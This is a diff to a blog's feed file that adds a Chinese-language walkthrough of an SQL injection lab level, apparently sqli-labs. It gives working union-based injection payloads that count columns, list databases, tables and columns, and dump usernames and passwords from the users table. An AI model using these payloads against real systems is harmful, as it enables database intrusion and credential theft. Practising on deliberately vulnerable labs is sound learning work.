@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>Leve1</title>
+    <link href="/2021/01/17/leve1/"/>
+    <url>/2021/01/17/leve1/</url>
+    
+    <content type="html"><![CDATA[<h2 id="leve1"><a href="#leve1" class="headerlink" title="leve1"></a>leve1</h2><p>输入id=1,有回显；此外，2，3，4……12均有回显，说明有12条数据。</p><p>接下来使用<code>order by 1 %23</code><br><code>order by 1,2 %23</code><br>…….<br>得到一共有三列<br>将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面的显示位。<br><img src="https://ftp.bmp.ovh/imgs/2021/01/7fe5a0b12e1c7810.png"><br>2，3两个显示位；<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 %23</code> 得到库名<img src="https://ftp.bmp.ovh/imgs/2021/01/e273266cd62bab04.png"><br>获取security库中的表<br><code>id=33&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;) %23</code><img src="https://ftp.bmp.ovh/imgs/2021/01/bff49f0f721798e4.png"><br>users下的列名<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/fd5c32324cb27880.png"></p><p>username:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(username) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/a68dcca44529904f.png"><br>password:<code>id=88&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(password) from security.users) %23</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/79f09d504315ca8b.png"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>noet</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题003</title>
     <link href="/2021/01/17/BUU003/"/>
     <url>/2021/01/17/BUU003/</url>
